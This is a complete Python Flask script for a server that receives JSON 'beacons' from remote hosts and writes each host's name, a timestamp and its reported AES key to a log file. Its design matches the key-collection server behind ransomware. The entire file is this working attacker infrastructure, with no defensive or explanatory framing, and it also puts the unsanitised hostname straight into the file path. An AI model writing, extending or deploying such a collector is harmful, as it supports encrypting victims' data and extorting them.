from flask import Flask, request
import os
from datetime import datetime

app = Flask(__name__)

# Directory where logs will be saved
LOG_DIR = "logs"

# Make sure the directory exists
os.makedirs(LOG_DIR, exist_ok=True)

@app.route('/', methods=['POST'])
def receive_beacon():
    data = request.get_json()

    if not data:
        return "Invalid JSON", 400

    aes_key = data.get("aes_key", "N/A")
    hostname = data.get("hostname", "unknown_host")
    timestamp = data.get("timestamp", datetime.utcnow().isoformat())

    filename_safe_timestamp = timestamp.replace(":", "-")
    log_filename = f"log_{hostname}_{filename_safe_timestamp}.log"
    log_path = os.path.join(LOG_DIR, log_filename)

    try:
        with open(log_path, 'w') as f:
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"AES Key: {aes_key}\n")
        print(f"[+] Beacon logged to {log_path}")
        return "Beacon received", 200
    except Exception as e:
        print(f"[-] Failed to write log: {e}")
        return "Error saving log", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8999)